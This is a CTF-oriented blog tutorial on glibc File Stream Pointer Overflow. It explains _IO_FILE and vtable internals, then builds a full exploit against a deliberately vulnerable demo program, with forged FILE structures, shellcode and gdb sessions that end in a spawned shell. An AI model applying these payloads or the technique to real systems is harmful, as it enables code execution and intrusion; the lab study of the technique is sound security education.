---
title: File Stream Pointer Overflow
date: 2016-11-19 03:53:31
tags:
- overflow
- FSPO
- _IO_list_all
categories:
- misc_exploit
---

Recently I learned 2 exploiting ways which were very useful in ctf games. 

## FSPO-->File Stream Pointer Overflow

When a new FILE structure is allocated and its pointer returned from fopen(), glibc has actually allocated an internal structure called struct _IO_FILE_plus, which contains struct _IO_FILE and a pointer to struct _IO_jump_t, which in turn contains a list of pointers for all the functions attached to the FILE. This is its vtable, which, just like C++ vtables, is used whenever any stream function is called with the FILE.

### Theory
<!-- more -->

First let'a see some important structures which are playing a key role in FSPO.
Definition of _IO_list_all： (because it's related to the program pwn450 in Shanghai Security Contest, I wrote down)
```c
struct _IO_FILE_plus *_IO_list_all = &_IO_2_1_stderr_;
```
Definition of _IO_FILE_plus：
```c
/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */
 
struct _IO_FILE_plus
{
    _IO_FILE file;
    const struct _IO_jump_t *vtable;
};

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
 #if 0
    get_column;
    set_column;
 #endif
};

/*Initialize the _IO_file_jumps*/
#define JUMP_INIT(NAME, VALUE) VALUE
const struct _IO_jump_t _IO_file_jumps =
{
   JUMP_INIT_DUMMY,
   JUMP_INIT(finish, _IO_file_finish),
   JUMP_INIT(overflow, _IO_file_overflow),
   JUMP_INIT(underflow, _IO_file_underflow),
   JUMP_INIT(uflow, _IO_default_uflow),
   JUMP_INIT(pbackfail, _IO_default_pbackfail),
   JUMP_INIT(xsputn, _IO_file_xsputn),
   JUMP_INIT(xsgetn, _IO_file_xsgetn),
   JUMP_INIT(seekoff, _IO_new_file_seekoff),
   JUMP_INIT(seekpos, _IO_default_seekpos),
   JUMP_INIT(setbuf, _IO_new_file_setbuf),
   JUMP_INIT(sync, _IO_new_file_sync),
   JUMP_INIT(doallocate, _IO_file_doallocate),
   JUMP_INIT(read, _IO_file_read),
   JUMP_INIT(write, _IO_new_file_write),
   JUMP_INIT(seek, _IO_file_seek),
   JUMP_INIT(close, _IO_file_close),
   JUMP_INIT(stat, _IO_file_stat),
   JUMP_INIT(showmanyc, _IO_default_showmanyc),
   JUMP_INIT(imbue, _IO_default_imbue)
};

#define JUMP_FIELD(TYPE, NAME) TYPE NAME

struct _IO_FILE 
{
    int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
  #define _IO_file_flags _flags
 
    /* The following pointers correspond to the C++ streambuf protocol. */
    /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
    char* _IO_read_ptr;   /* Current read pointer */
    char* _IO_read_end;   /* End of get area. */
    char* _IO_read_base;  /* Start of putback+get area. */
    char* _IO_write_base; /* Start of put area. */
    char* _IO_write_ptr;  /* Current put pointer. */
    char* _IO_write_end;  /* End of put area. */
    char* _IO_buf_base;   /* Start of reserve area. */
    char* _IO_buf_end;    /* End of reserve area. */
    /* The following fields are used to support backing up and undo. */
    char *_IO_save_base; /* Pointer to start of non-current get area. */
    char *_IO_backup_base;  /* Pointer to first valid character of backup area */
    char *_IO_save_end; /* Pointer to end of non-current get area. */
 
    struct _IO_marker *_markers;
 
    struct _IO_FILE *_chain;
 
    int _fileno;
  #if 0
    int _blksize;
  #else
    int _flags2;
  #endif
    _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
 
  #define __HAVE_COLUMN /* temporary */
    /* 1+column number of pbase(); 0 is unknown. */
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
 
    /*  char* _save_gptr;  char* _save_egptr; */
 
    _IO_lock_t *_lock;
  #ifdef _IO_USE_OLD_IO_FILE
};
```
So here is the picture:
<img src="http://of38fq57s.bkt.clouddn.com/struct__IO__FILE__plus__coll__graph.png">

And above is just the definition of some key structure. We must figure out how they work first and then to exploit!

OK! Go on my trip. 

Reading its source code cost much time, but it's worth to do that!
First let's figure out what exactly stdin, stdout and stderr are.
```c
typedef struct _IO_FILE FILE;

extern struct _IO_FILE_plus _IO_2_1_stdin_;
extern struct _IO_FILE_plus _IO_2_1_stdout_;
extern struct _IO_FILE_plus _IO_2_1_stderr_;

_IO_FILE *stdin = (FILE *) &_IO_2_1_stdin_;
_IO_FILE *stdout = (FILE *) &_IO_2_1_stdout_;
_IO_FILE *stderr = (FILE *) &_IO_2_1_stderr_;

#  define DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \
  struct _IO_FILE_plus NAME \
    = {FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \
      &_IO_file_jumps};

DEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES);
DEF_STDFILE(_IO_2_1_stdout_, 1, &_IO_2_1_stdin_, _IO_NO_READS);
DEF_STDFILE(_IO_2_1_stderr_, 2, &_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);
```
Let's have a look of FILEBUF_LITERAL. It will initialize _IO_FILE.
```c
#  define FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \
      { _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (_IO_FILE *) CHAIN, FD, \
  0, _IO_pos_BAD, 0, 0, { 0 }, 0, _IO_pos_BAD, \
  0 }
```
According to _IO_FILE, the value of FD is assigned to _fileno field of _IO_FILE structure. To be honest, it's just a little bit useful to our exploit just mentioned above. I just want to know what stdin, stdout and stderr are!

Next let's turn to _IO_jump_t.... OK, it's kind of complex, so I have to read the source of glibc. And next I will analyse the function of fputs to find out how _IO_jump_t works.

```c
int
_IO_fputs (str, fp)
    const char *str;
    _IO_FILE *fp;
{
    _IO_size_t len = strlen (str);
    int result = EOF;
    CHECK_FILE (fp, EOF);
    _IO_acquire_lock (fp);
    if ((_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1)
        && _IO_sputn (fp, str, len) == len)
        result = 1;
    _IO_release_lock (fp);
    return result;
}

#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)

#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)

#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

# define _IO_JUMPS_FUNC(THIS) \
  (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS ((struct _IO_FILE_plus *) (THIS)) \
                + (THIS)->_vtable_offset))
```
As we can see, the function _IO_file_xsputn is executed when calling fputs(). I aslo checked some other functions: for example, fread() will call _IO_file_xsgetn, fclose() will call _IO_file_finish and so on.

 What I want to say is that the table is very important to _IO_FILE. It contains the addresses of some related functions that will be executed in different situations. And what we will do is to overwrite the vtable and gain the control of execution flow to execute our expected function or shellcode.
<img src="http://of38fq57s.bkt.clouddn.com/_IO_FIlE.png">

### Exploit

Now we've understood the theory and next we will take a demo to show how to exploit using this tech.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc,char **argv)
{
   FILE *test;
   char msg[] = "no segfault yet/n";
   char stage[1024];
   if(argc < 2) {
      printf("usage : %s <argument>/n", argv[0]);
      exit(-1);
   }
   test = fopen("temp", "a");
   strcpy(stage, argv[1]);
   fprintf(test, "%s", msg);
   exit(0);
}
```
By default, DEP and stack protector are closed:
```shell
gcc -fno-stack-protector -z execstack -o file file.c
```

The content of input buffer should be:
[1]{ Fake FILE Stream Structure }--->[2]{ Fake jumptable }--->[3]{ Shellcode }--->[4]{ Addresses of the Fake FILE Stream Structure }
But personally, I think it didn't work according to the File Stream Pointer Overflows Paper when the fake FILE structure is filled with the address of jumptalbe.(I've tried many times!). So I will change a mind.

Fisrt let's calculate the distance between variable stage and test. It's 1042 bytes. So we can overwrite the FILE pointer test:
```shell
gdb-peda$ r `python -c 'print "a"*1042 + "AAAA"'`
Starting program: /home/wolfzhang/Desktop/file `python -c 'print "a"*1042 + "AAAA"'`
len: 1042

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x16 
EBX: 0xb7fc0000 --> 0x1a9da8 
ECX: 0x8048500 (<main+19>:	outs   dx,BYTE PTR ds:[esi])
EDX: 0x100 
ESI: 0x41414141 ('AAAA')
EDI: 0x16 
EBP: 0xbfffebb8 --> 0x0 
ESP: 0xbfffe750 --> 0xbfffeb9a ('a' <repeats 18 times>, "AAAA")
EIP: 0xb7e7a0c4 (<__GI__IO_fputs+36>:	mov    eax,DWORD PTR [esi])
EFLAGS: 0x10212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7e7a0ba <__GI__IO_fputs+26>:	mov    DWORD PTR [esp],eax
   0xb7e7a0bd <__GI__IO_fputs+29>:	call   0xb7e90d20 <__strlen_ia32>
   0xb7e7a0c2 <__GI__IO_fputs+34>:	mov    edi,eax
=> 0xb7e7a0c4 <__GI__IO_fputs+36>:	mov    eax,DWORD PTR [esi]
   0xb7e7a0c6 <__GI__IO_fputs+38>:	and    eax,0x8000
   0xb7e7a0cb <__GI__IO_fputs+43>:	jne    0xb7e7a102 <__GI__IO_fputs+98>
   0xb7e7a0cd <__GI__IO_fputs+45>:	mov    edx,DWORD PTR [esi+0x48]
   0xb7e7a0d0 <__GI__IO_fputs+48>:	mov    ebp,DWORD PTR gs:0x8
[------------------------------------stack-------------------------------------]
0000| 0xbfffe750 --> 0xbfffeb9a ('a' <repeats 18 times>, "AAAA")
0004| 0xbfffe754 --> 0xb7fc0000 --> 0x1a9da8 
0008| 0xbfffe758 --> 0x0 
0012| 0xbfffe75c --> 0x0 
0016| 0xbfffe760 --> 0xbfffebb8 --> 0x0 
0020| 0xbfffe764 --> 0xb7ff2500 (<_dl_runtime_resolve+16>:	pop    edx)
0024| 0xbfffe768 --> 0xbfffeba3 ("aaaaaaaaaAAAA")
0028| 0xbfffe76c --> 0xb7fc0000 --> 0x1a9da8 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__GI__IO_fputs (str=0xbfffeb9a 'a' <repeats 18 times>, "AAAA", fp=0x41414141) at iofputs.c:38
38	iofputs.c: No such file or directory.

gdb-peda$ x/30xw $ebp-0x20
0xbfffeb98: 0x61616161  0x61616161  0x61616161  0x61616161
0xbfffeba8: 0x61616161  0x41414141  0x08048500  0x00000000
```
The program crached because of the FILE structure at AAAA which is not a valid address. 
So next let's make a fake FILE structure. You know it's kind of difficult to make a fake FILE structure manually. So just take stderr(stdin or stdout) as the fake structure.

```shell
gdb-peda$ p sizeof(FILE)
$1 = 0x94
gdb-peda$ x/148bx stderr
0xb7fc0960 <_IO_2_1_stderr_>:   0x86    0x20    0xad    0xfb    0x00    0x00    0x00    0x00
0xb7fc0968 <_IO_2_1_stderr_+8>: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc0970 <_IO_2_1_stderr_+16>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc0978 <_IO_2_1_stderr_+24>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc0980 <_IO_2_1_stderr_+32>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc0988 <_IO_2_1_stderr_+40>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc0990 <_IO_2_1_stderr_+48>:    0x00    0x00    0x00    0x00    0xc0    0x0a    0xfc    0xb7
0xb7fc0998 <_IO_2_1_stderr_+56>:    0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09a0 <_IO_2_1_stderr_+64>:    0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
0xb7fc09a8 <_IO_2_1_stderr_+72>:    0x8c    0x18    0xfc    0xb7    0xff    0xff    0xff    0xff
0xb7fc09b0 <_IO_2_1_stderr_+80>:    0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
0xb7fc09b8 <_IO_2_1_stderr_+88>:    0x00    0x0a    0xfc    0xb7    0x00    0x00    0x00    0x00
0xb7fc09c0 <_IO_2_1_stderr_+96>:    0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09c8 <_IO_2_1_stderr_+104>:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09d0 <_IO_2_1_stderr_+112>:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09d8 <_IO_2_1_stderr_+120>:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09e0 <_IO_2_1_stderr_+128>:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09e8 <_IO_2_1_stderr_+136>:   0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xb7fc09f0 <_IO_2_1_stderr_+144>:   0x00    0x00    0x00    0x00
```
Because of strcpy() will stop copy when meeting 0x00, so we must replace 0x00 with another value. From above we can know the variable test is at 0xbfffebac, so we make fake structure at 0xbfffebac - 160-->0xbfffeb0c. Let's just have a try what will happen when replacing the FILE structure:
```shell
r "`python -c 'print "a"*882+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAAAA\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAAAAAA"+"\x0c\xeb\xff\xbf"'`"

 [----------------------------------registers-----------------------------------]
EAX: 0x80482 
EBX: 0xb7fc0000 --> 0x1a9da8 
ECX: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")
EDX: 0xb7fc188c --> 0x1 
ESI: 0xbfffeb0c --> 0xfbad2086 
EDI: 0x16 
EBP: 0xb7e15940 (0xb7e15940)
ESP: 0xbfffe750 --> 0xbfffeb0c --> 0xfbad2086 
EIP: 0xb7e7a140 (<__GI__IO_fputs+160>:  call   DWORD PTR [eax+0x1c])
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7e7a135 <__GI__IO_fputs+149>: mov    DWORD PTR [esp+0x8],edi
   0xb7e7a139 <__GI__IO_fputs+153>: mov    DWORD PTR [esp],esi
   0xb7e7a13c <__GI__IO_fputs+156>: mov    DWORD PTR [esp+0x4],ecx
=> 0xb7e7a140 <__GI__IO_fputs+160>: call   DWORD PTR [eax+0x1c]
   0xb7e7a143 <__GI__IO_fputs+163>: cmp    edi,eax
   0xb7e7a145 <__GI__IO_fputs+165>: jne    0xb7e7a190 <__GI__IO_fputs+240>
   0xb7e7a147 <__GI__IO_fputs+167>: mov    edx,0x1
   0xb7e7a14c <__GI__IO_fputs+172>: test   DWORD PTR [esi],0x8000
Guessed arguments:
arg[0]: 0xbfffeb0c --> 0xfbad2086 
arg[1]: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")
arg[2]: 0x16 
[------------------------------------stack-------------------------------------]
0000| 0xbfffe750 --> 0xbfffeb0c --> 0xfbad2086 
0004| 0xbfffe754 --> 0xbfffeb9a ("AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277")
0008| 0xbfffe758 --> 0x16 
0012| 0xbfffe75c --> 0x0 
0016| 0xbfffe760 --> 0xbfffebb8 --> 0x0 
0020| 0xbfffe764 --> 0xb7ff2500 (<_dl_runtime_resolve+16>:  pop    edx)
0024| 0xbfffe768 --> 0xbfffeba3 --> 0x414141b7 
0028| 0xbfffe76c --> 0xb7fc0000 --> 0x1a9da8 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0xb7e7a140 in __GI__IO_fputs (str=0xbfffeb9a "AAAAAA\240\372\373\267AAAAAAAA\f\353\377\277", fp=0xbfffeb0c) at iofputs.c:40
40  iofputs.c: No such file or directory.
```
I guess it should execute the function whose address was in _IO_jump_t table. However we didn't provide the proper address, the program crashed. 

Let's see how the program get the address saved in _IO_jump_t:
```shell
gdb-peda$ x/10i __GI__IO_fputs+134
   0xb7e7a126 <__GI__IO_fputs+134>: movsx  eax,BYTE PTR [esi+0x46]
   0xb7e7a12a <__GI__IO_fputs+138>: mov    eax,DWORD PTR [esi+eax*1+0x94]  [#1]
   0xb7e7a131 <__GI__IO_fputs+145>: mov    ecx,DWORD PTR [esp+0x30]
   0xb7e7a135 <__GI__IO_fputs+149>: mov    DWORD PTR [esp+0x8],edi
   0xb7e7a139 <__GI__IO_fputs+153>: mov    DWORD PTR [esp],esi
   0xb7e7a13c <__GI__IO_fputs+156>: mov    DWORD PTR [esp+0x4],ecx
=> 0xb7e7a140 <__GI__IO_fputs+160>: call   DWORD PTR [eax+0x1c]   [#2]
   0xb7e7a143 <__GI__IO_fputs+163>: cmp    edi,eax
   0xb7e7a145 <__GI__IO_fputs+165>: jne    0xb7e7a190 <__GI__IO_fputs+240>
   0xb7e7a147 <__GI__IO_fputs+167>: mov    edx,0x1
```
ESI points to our fake FILE structure. What we concern about is line #1 which will get the address of _IO_jump_t: first to get the byte value from [esi+0x46]. According to the source code of fputs, it should be the _vtable_offset field of FILE structure. Then to get the address of _IO_jump_t: generally, eax should equal 0, but in our exploit, we let eax equals 8. And next the program will push the args into stack and call _IO_file_xsputn in line #2. It's perfectly match the structure of _IO_jump_t where _IO_file_xsputn is at the offset 0x1c.

So finally, the content of input buffer is:
{ padding }--->{ shellcode_address }--->{ shellcode }--->{ padding }--->{ fake FILE structure }--->{ _IO_jump_t address }--->{ fake FILE pointer }

```
buffer-->0xbfffe79a
FFSS-->0xbfffeb0c
sc_addr-->0xbfffe7bc
shellcode: \x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80
```

Now let's exploit the program:

```shell
gdb-peda$ r "`python -c 'print "aa"+"b"*28 + "BBBB" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"
Starting program: /home/wolfzhang/Desktop/file "`python -c 'print "aa"+"b"*28 + "BBBB" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"
len: 1042

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0xbfffe79c ('b' <repeats 28 times>, "BBBBj\vX1\366Vh//shh/bin\211\343\061ɉ\312̀", 'a' <repeats 144 times>...)
EBX: 0xb7fc0000 --> 0x1a9da8 
ECX: 0xbfffeb9a ("AAAAAA\240\372\373\267AAAA\234\347\377\277\f\353\377\277")
EDX: 0xb7fc188c --> 0x1 
ESI: 0xbfffeb0c --> 0xfbad2086 
EDI: 0x16 
EBP: 0xb7e15940 (0xb7e15940)
ESP: 0xbfffe74c --> 0xb7e7a143 (<__GI__IO_fputs+163>: cmp    edi,eax)
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbfffe74c --> 0xb7e7a143 (<__GI__IO_fputs+163>:  cmp    edi,eax)
0004| 0xbfffe750 --> 0xbfffeb0c --> 0xfbad2086 
0008| 0xbfffe754 --> 0xbfffeb9a ("AAAAAA\240\372\373\267AAAA\234\347\377\277\f\353\377\277")
0012| 0xbfffe758 --> 0x16 
0016| 0xbfffe75c --> 0x0 
0020| 0xbfffe760 --> 0xbfffebb8 --> 0x0 
0024| 0xbfffe764 --> 0xb7ff2500 (<_dl_runtime_resolve+16>:  pop    edx)
0028| 0xbfffe768 --> 0xbfffeba3 --> 0x414141b7 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
```
Now we can control EIP, so next let's replace 'BBBB' to the shellcode's address.

```shell
gdb-peda$ r "`python -c 'print "aa"+"b"*28 + "\xbc\xe7\xff\xbf" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"
Starting program: /home/wolfzhang/Desktop/file "`python -c 'print "aa"+"b"*28 + "\xbc\xe7\xff\xbf" + "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"+"a"*824+"\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x1a\xfc\xb7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\x8c\x18\xfc\xb7\xff\xff\xff\xff\xff\xff\xff\xffAAAAA\x1a\xfc\xb7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\xfa\xfb\xb7AAAA\x9c\xe7\xff\xbf"+"\x0c\xeb\xff\xbf"'`"
len: 1042
process 4494 is executing new program: /bin/dash
$ id
[New process 4498]
process 4498 is executing new program: /usr/bin/id
uid=1000(wolfzhang) gid=1000(wolfzhang) groups=1000(wolfzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```
Look, we got a shell! 

### Links
[Head First FILE Stream Pointer Overflow](http://www.evil0x.com/posts/13764.html)
[abusing the FILE structure](https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/)
[File Stream Pointer Overflows Paper](http://www.ouah.org/fsp-overflows.txt)









